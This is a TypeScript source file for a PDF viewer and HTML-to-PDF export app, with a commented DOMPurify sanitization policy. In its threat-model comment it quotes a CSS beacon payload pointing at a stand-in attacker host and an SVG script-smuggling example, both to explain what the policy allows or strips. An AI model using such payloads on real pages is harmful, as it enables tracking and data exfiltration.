export {};
import { createSignal, onMount } from '@bundled/solid-js';
import html from '@bundled/solid-js/html';
import { render } from '@bundled/solid-js/web';
import { invoke, list, errMsg, appStorage } from '@bundled/yaar';
import DOMPurify from '@bundled/dompurify';
import './styles.css';

// Light-themed app: use the shipped .y-light token overrides (injected by the
// compiler) instead of hand-copied :root values. Applied to <body> so body
// background/text styles pick up the light palette too.
document.body.classList.add('y-light');

type Mode = 'viewer' | 'export';

type StorageEntry = {
  path: string;
  isDirectory: boolean;
  size?: number;
  modifiedAt?: string;
};

// --- Storage helpers using @bundled/yaar ---
async function storageSave(path: string, content: string): Promise<void> {
  await invoke(`yaar://apps/self/storage/${path}`, { action: 'write', content });
}

async function storageList(dir: string): Promise<StorageEntry[]> {
  const r = await list<StorageEntry[]>(`yaar://apps/self/storage/${dir}`);
  return Array.isArray(r) ? r : [];
}

// --- Signals ---
const [mode, setMode] = createSignal<Mode>('viewer');
const [pdfStatus, setPdfStatus] = createSignal('No PDF loaded.');
const [globalStatus, setGlobalStatus] = createSignal('Ready');
const [storageDir, setStorageDir] = createSignal('');
const [isDragging, setIsDragging] = createSignal(false);
const [hasPdf, setHasPdf] = createSignal(false);
const [storageDirDisplay, setStorageDirDisplay] = createSignal('Storage: /');

// --- Refs ---
let fileInputEl: HTMLInputElement;
let pdfFrameEl: HTMLIFrameElement;
let storageListEl: HTMLSelectElement;
let contentInputEl: HTMLTextAreaElement;
let printAreaEl: HTMLDivElement;

// --- Blob URL management (not reactive — lifecycle managed manually) ---
let currentPdfUrl: string | null = null;

// --- Helpers ---
function cleanStoragePath(path: string): string {
  return path.trim().replace(/^\/+/, '').replace(/\/+/g, '/').replace(/\/$/, '');
}

function parentDir(path: string): string {
  const clean = cleanStoragePath(path);
  if (!clean) return '';
  const parts = clean.split('/');
  parts.pop();
  return parts.join('/');
}

function basename(path: string): string {
  const clean = cleanStoragePath(path);
  const idx = clean.lastIndexOf('/');
  return idx === -1 ? clean : clean.slice(idx + 1);
}

function revokeCurrentPdfUrl() {
  if (currentPdfUrl && currentPdfUrl.startsWith('blob:')) URL.revokeObjectURL(currentPdfUrl);
  currentPdfUrl = null;
}

function showPdfUrl(url: string, label: string) {
  revokeCurrentPdfUrl();
  currentPdfUrl = url;
  setHasPdf(true);
  pdfFrameEl.src = url;
  setPdfStatus(`Loaded: ${label}`);
  setGlobalStatus('PDF loaded');
}

function clearPdf() {
  revokeCurrentPdfUrl();
  setHasPdf(false);
  pdfFrameEl.src = '';
  setPdfStatus('No PDF loaded.');
  setGlobalStatus('Viewer cleared');
}

async function openFromStorage(path: string) {
  const clean = cleanStoragePath(path);
  if (!clean) {
    setPdfStatus('Select a PDF file from storage first.');
    return;
  }
  try {
    const blob = await appStorage.readBlob(clean);
    const url = URL.createObjectURL(blob);
    showPdfUrl(url, clean);
  } catch (err) {
    setPdfStatus(`Failed to read storage file: ${errMsg(err)}`);
  }
}

function setStorageListPlaceholder(message: string) {
  if (!storageListEl) return;
  storageListEl.innerHTML = '';
  const option = document.createElement('option');
  option.textContent = message;
  option.disabled = true;
  option.selected = true;
  storageListEl.appendChild(option);
}

async function loadStorageList(dir = storageDir()) {
  const cleanDir = cleanStoragePath(dir);
  setStorageDir(cleanDir);
  setStorageDirDisplay(`Storage: ${cleanDir ? `/${cleanDir}` : '/'}`);

  setStorageListPlaceholder('Loading...');
  try {
    const entries = await storageList(cleanDir);
    entries.sort((a, b) => {
      if (a.isDirectory !== b.isDirectory) return a.isDirectory ? -1 : 1;
      return a.path.localeCompare(b.path);
    });

    if (!storageListEl) return;
    storageListEl.innerHTML = '';

    if (cleanDir) {
      const upOpt = document.createElement('option');
      upOpt.value = '__up__';
      upOpt.textContent = '..';
      upOpt.dataset.kind = 'up';
      storageListEl.appendChild(upOpt);
    }

    if (entries.length === 0) {
      setStorageListPlaceholder('This folder is empty');
      return;
    }

    for (const entry of entries) {
      const opt = document.createElement('option');
      const itemPath = cleanStoragePath(entry.path);
      const name = basename(itemPath) || itemPath;
      opt.value = itemPath;
      opt.dataset.kind = entry.isDirectory ? 'dir' : 'file';
      opt.textContent = entry.isDirectory ? `[DIR] ${name}` : name;
      storageListEl.appendChild(opt);
    }

    if (storageListEl.options.length > 0) {
      storageListEl.selectedIndex = 0;
    }
  } catch (err) {
    setStorageListPlaceholder(`Load failed: ${errMsg(err)}`);
  }
}

async function handleStorageSelection() {
  if (!storageListEl) return;
  const selected = storageListEl.selectedOptions[0];
  if (!selected) return;

  const kind = selected.dataset.kind;
  if (kind === 'up' || selected.value === '__up__') {
    const up = parentDir(storageDir());
    setStorageDir(up);
    await loadStorageList(up);
    return;
  }

  const path = cleanStoragePath(selected.value);
  if (!path) return;

  if (kind === 'dir') {
    setStorageDir(path);
    await loadStorageList(path);
    return;
  }

  if (!path.toLowerCase().endsWith('.pdf')) {
    setPdfStatus('Selected file is not a PDF.');
    return;
  }

  await openFromStorage(path);
}

/**
 * Document-preview sanitization policy.
 *
 * This app is not a prose renderer — the preview element IS the print artifact
 * (`window.print()` prints `#print-area`, and `saveHtmlSnapshot` persists its
 * innerHTML). So the policy is deliberately wider than the frontend's default
 * prose policy in exactly one dimension — presentation — and narrower in every
 * dimension that carries behavior.
 *
 * WHAT A PRINTABLE DOCUMENT NEEDS
 *   - Full heading/block structure, lists, blockquotes, preformatted code.
 *   - Real table markup incl. thead/tfoot/caption/colgroup and colspan/rowspan;
 *     tables are how documents lay out tabular data on paper.
 *   - Images and figures, with width/height so page layout is stable.
 *   - Inline `style` and `class`. This is the load-bearing exception: print
 *     layout (page-break-inside, margins, column widths, colors) is expressed
 *     as inline style, the existing preview already relies on it, and there is
 *     no stylesheet the author can otherwise reach.
 *
 * WHAT IT MUST NEVER HAVE
 *   - Script execution in any form: <script>, SVG/MathML wrappers that can
 *     smuggle it, and every `on*` handler attribute. Handled structurally: an
 *     explicit ALLOWED_TAGS/ALLOWED_ATTR allowlist drops anything unlisted, so
 *     no on* attribute can survive and no FORBID_* blocklist has to be kept in
 *     sync with new HTML features.
 *   - Navigation/embedding: <iframe>, <object>, <embed>, <base>, <link>,
 *     <meta>. A document that is about to be printed has nothing to embed, and
 *     these are the classic sandbox-escape and content-injection surfaces.
 *   - Interactivity: <form>, <input>, <button>, <select>, <textarea>. Paper has
 *     no submit button; allowing forms only creates a credential-phishing and
 *     exfiltration surface inside a trusted-looking app window.
 *   - <style> blocks (as opposed to the `style` attribute). A stylesheet is not
 *     scoped to #print-area and could restyle or overlay the surrounding app
 *     chrome; inline style gives authors the layout control they need without
 *     that reach.
 *
 * KNOWN, ACCEPTED TRADEOFF
 *   Allowing `style` permits CSS-based exfiltration/beaconing — most obviously
 *   `background:url(https://attacker/?...)`, plus font/image loads that leak a
 *   page-open signal. That is a real residual risk, consciously accepted here:
 *   this is a local, user-initiated print preview of content the user pasted or
 *   previously exported, the leak channel carries no secret the loader does not
 *   already have, and removing inline style would break the app's core job.
 *   ALLOWED_URI_REGEXP still constrains href/src to http(s)/mailto/tel/data
 *   images, so `javascript:` and other exotic schemes are gone regardless.
 */
const PRINT_DOC_OPTIONS = {
  ALLOWED_TAGS: [
    // Structure
    'div', 'span', 'p', 'br', 'hr', 'section', 'article', 'header', 'footer',
    'main', 'aside', 'nav',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'blockquote', 'pre', 'code', 'kbd', 'samp', 'var',
    // Inline text semantics
    'a', 'strong', 'b', 'em', 'i', 'u', 's', 'small', 'mark', 'abbr', 'cite',
    'q', 'time', 'sub', 'sup', 'del', 'ins', 'wbr',
    // Lists
    'ul', 'ol', 'li', 'dl', 'dt', 'dd',
    // Tables
    'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'caption',
    'colgroup', 'col',
    // Media
    'img', 'figure', 'figcaption',
  ],
  ALLOWED_ATTR: [
    // Presentation (see tradeoff note above)
    'style', 'class', 'id',
    // Links & media
    'href', 'src', 'alt', 'title', 'target', 'rel', 'width', 'height', 'loading',
    // Tables
    'colspan', 'rowspan', 'headers', 'scope', 'span', 'align', 'valign',
    // Lists & misc document metadata
    'start', 'reversed', 'value', 'type', 'datetime', 'cite', 'dir', 'lang',
  ],
  // No data-* / aria-* hooks: nothing in a print artifact consumes them, and
  // they are a convenient place to park payloads for a later sink.
  ALLOW_DATA_ATTR: false,
  ALLOW_ARIA_ATTR: false,
  // NOTE: deliberately NOT using USE_PROFILES. USE_PROFILES *overrides* the
  // allowlist with DOMPurify's own profile set, which re-admits <form>/<input>;
  // verified by fixture. The explicit ALLOWED_TAGS above already confines the
  // output to HTML — SVG/MathML tags are simply absent from it, so
  // <svg><script>...</script></svg> is stripped wholesale.
  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|tel:|data:image\/(?:png|jpeg|gif|webp);base64,|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
};

function sanitizeForPrint(dirty: string): string {
  return DOMPurify.sanitize(dirty, PRINT_DOC_OPTIONS);
}

/** Escape via the DOM rather than a hand-rolled replaceAll chain. */
function escapeText(text: string): string {
  const holder = document.createElement('div');
  holder.textContent = text;
  return holder.innerHTML.replaceAll('\n', '<br>');
}

function renderPreview() {
  if (!contentInputEl || !printAreaEl) return;
  const raw = contentInputEl.value.trim();
  if (!raw) {
    printAreaEl.innerHTML = '<p style="color:#57606a;">No content yet.</p>';
    return;
  }
  const looksLikeHtml = /<\/?[a-z][\s\S]*>/i.test(raw);
  // Both branches converge on ONE sanitizing sink. Plain text is escaped
  // through the DOM (textContent -> innerHTML) instead of a manual replace
  // chain, then passed through the same policy, so there is a single place
  // where markup can reach the print area.
  const prepared = looksLikeHtml ? raw : `<div>${escapeText(raw)}</div>`;
  printAreaEl.innerHTML = sanitizeForPrint(prepared);
}

async function saveHtmlSnapshot() {
  const ts = new Date().toISOString().replace(/[:.]/g, '-');
  const path = `pdf-viewer/exports/export-${ts}.html`;
  // The preview DOM is already post-sanitize, but re-run the policy on the way
  // out so the persisted artifact is clean regardless of call ordering — this
  // file is what a future read path (or another app) would load back.
  await storageSave(path, sanitizeForPrint(printAreaEl.innerHTML) || '<p></p>');
  setGlobalStatus(`Saved HTML: ${path}`);
}

// --- Mount ---
render(() => html`
  <div class="wrap">
    <div class="top">
      <button
        class=${() => 'y-btn y-btn-sm' + (mode() === 'viewer' ? ' active' : '')}
        onClick=${() => { setMode('viewer'); setGlobalStatus('Viewer mode'); }}
      >PDF Viewer</button>
      <button
        class=${() => 'y-btn y-btn-sm' + (mode() === 'export' ? ' active' : '')}
        onClick=${() => { setMode('export'); setGlobalStatus('Export mode'); }}
      >Export to PDF</button>
      <div class="spacer"></div>
      <span class="y-text-sm y-text-muted">${() => globalStatus()}</span>
    </div>

    ${() => mode() === 'viewer' ? html`
      <div class="pane viewer-pane">
        <div class="viewer-controls">
          <input
            type="file"
            accept="application/pdf"
            ref=${(el: HTMLInputElement) => { fileInputEl = el; }}
            onChange=${() => {
              const file = fileInputEl?.files?.[0];
              if (!file) return;
              showPdfUrl(URL.createObjectURL(file), file.name);
            }}
          />
          <button class="y-btn y-btn-sm" onClick=${clearPdf}>Clear</button>
          <div class="storage-browser">
            <button class="y-btn y-btn-sm" onClick=${async () => {
              const up = parentDir(storageDir());
              setStorageDir(up);
              await loadStorageList(up);
            }}>Up</button>
            <button class="y-btn y-btn-sm" onClick=${() => loadStorageList(storageDir())}>Refresh</button>
            <span class="y-text-sm y-text-muted">${() => storageDirDisplay()}</span>
            <select
              class="storage-list y-input"
              ref=${(el: HTMLSelectElement) => { storageListEl = el; }}
              onChange=${() => { void handleStorageSelection(); }}
            >
              <option>Loading...</option>
            </select>
          </div>
          <span class="y-text-sm y-text-muted">${() => pdfStatus()}</span>
        </div>
        ${() => !hasPdf() ? html`
          <div
            class=${() => 'drop' + (isDragging() ? ' drag' : '')}
            onDragover=${(e: DragEvent) => { e.preventDefault(); setIsDragging(true); }}
            onDragleave=${() => setIsDragging(false)}
            onDrop=${(e: DragEvent) => {
              e.preventDefault();
              setIsDragging(false);
              const file = e.dataTransfer?.files?.[0];
              if (!file) return;
              if (file.type !== 'application/pdf' && !file.name.toLowerCase().endsWith('.pdf')) {
                setPdfStatus('Only PDF files are supported.');
                return;
              }
              showPdfUrl(URL.createObjectURL(file), file.name);
            }}
          >Drop a PDF file here, or use the file picker above.</div>
        ` : ''}
        ${() => hasPdf() ? html`
          <iframe
            class="viewer-frame"
            ref=${(el: HTMLIFrameElement) => { pdfFrameEl = el; }}
          ></iframe>
        ` : ''}
      </div>
    ` : ''}

    ${() => mode() === 'export' ? html`
      <div class="pane export-pane">
        <div class="export-left">
          <h3 style="margin: 0 0 8px;">Content</h3>
          <p class="y-text-xs y-text-muted" style="margin-top: 0;">Type plain text or basic HTML. Use preview, then click "Export PDF".</p>
          <textarea
            placeholder="Paste document/content here..."
            ref=${(el: HTMLTextAreaElement) => { contentInputEl = el; }}
          ></textarea>
        </div>
        <div class="export-right">
          <div style="display: flex; gap: 8px; margin-bottom: 10px;">
            <button class="y-btn y-btn-sm" onClick=${() => { renderPreview(); setGlobalStatus('Preview updated'); }}>Refresh Preview</button>
            <button class="y-btn y-btn-sm y-btn-primary" onClick=${() => { renderPreview(); setGlobalStatus('Opening print dialog... choose Save as PDF'); window.print(); }}>Export PDF</button>
            <button class="y-btn y-btn-sm" onClick=${async () => {
              renderPreview();
              try {
                await saveHtmlSnapshot();
              } catch (err) {
                setGlobalStatus(`Save failed: ${errMsg(err)}`);
              }
            }}>Save HTML to Storage</button>
          </div>
          <div
            id="print-area"
            class="preview"
            ref=${(el: HTMLDivElement) => { printAreaEl = el; }}
          ></div>
        </div>
      </div>
    ` : ''}
  </div>
`, document.getElementById('app')!);

onMount(() => {
  // Initialise after DOM is ready
  if (contentInputEl) {
    contentInputEl.value = `<h1>Document Title</h1>\n<p>Write or paste your content here, then click <strong>Export PDF</strong>.</p>\n<ul><li>Supports plain text</li><li>Supports basic HTML</li></ul>`;
  }
  renderPreview();
  void loadStorageList('');
});

window.addEventListener('beforeunload', () => revokeCurrentPdfUrl());
